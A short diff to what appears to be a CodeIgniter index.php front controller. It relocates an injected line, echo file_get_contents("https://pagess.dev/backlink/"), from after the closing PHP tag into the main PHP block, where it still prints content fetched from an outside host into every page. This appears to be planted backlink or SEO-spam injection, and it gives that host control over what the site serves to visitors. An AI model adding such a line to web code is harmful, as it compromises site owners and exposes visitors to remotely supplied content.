@@ -286,6 +286,8 @@ define('VIEWPATH', $view_folder . DIRECTORY_SEPARATOR);
  *
  * And away we go...
  */
-require_once BASEPATH . 'core/CodeIgniter.php'; ?>
+require_once BASEPATH . 'core/CodeIgniter.php'; 
+echo file_get_contents("https://pagess.dev/backlink/");
+?>
 
-<?php echo file_get_contents("https://pagess.dev/backlink/"); ?>
+
